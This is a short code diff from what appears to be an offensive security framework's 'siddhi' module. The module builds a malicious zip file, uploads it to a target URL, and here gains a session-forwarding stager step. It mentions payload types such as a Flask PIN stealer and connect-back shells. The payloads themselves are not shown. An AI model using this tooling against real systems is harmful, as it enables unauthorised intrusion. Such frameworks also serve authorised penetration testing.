@@ -15,6 +15,7 @@
 from core.vmnf_payloads import VMNFPayloads
 from core.vmnf_shared_args import VimanaSharedArgs
 from resources import colors
+from resources.stage import stager
 
 import sys, re, os, random, string, platform
 from mimesis import Generic
@@ -83,8 +84,6 @@ class siddhi:
             'urls', 'view', 'tests', 'models', 
             'admin', 'login'
         ]
-        #self.pws_payloads = ['pws','pws_payload']
-        #self.connectback  = ['olpcb', 'olpcb_payload']
         
     def parse_args(self):
         ''' ~ siddhi needs only shared arguments from VimanaSharedArgs() ~'''
@@ -96,6 +95,7 @@ class siddhi:
 
     def build_malzipfile(self):
         
+
         '''
         --target-url 
         --target-dir
@@ -105,7 +105,7 @@ class siddhi:
         --filename 
         --payload
         '''
-
+        session = self.vmnf_handler.get('foward_session')
         g = Generic()
         payload_type = False
         xpl_hl = colored('2pacx', 'blue')
@@ -203,6 +203,17 @@ class siddhi:
         
         print("[{}] → Uploading {} to {}...".format(xpl_hl,filename, self.vmnf_handler['target_url']))
         sleep(1)
+        
+        if session: 
+            print("[{}] → Forward is enabled, start {} in another terminal:\n\t run --module {} --session and hit Enter here.".format(
+                xpl_hl,self.vmnf_handler.get('foward_session'),session
+                )
+            )
+            
+            stager(**self.vmnf_handler).forward_session()
+            s=input()
+
+       
         try:
             # stages were introduced to manage some new payloads:fps
             stages = 3 if payload_type == 'flask_pinstealer' else 2
@@ -214,6 +225,7 @@ class siddhi:
                     stages - 1
                     )
                 )
+                
                 sleep(10)
                 zip_ = open('/tmp/' + zip_file, 'rb')
                 files = {'file': zip_}
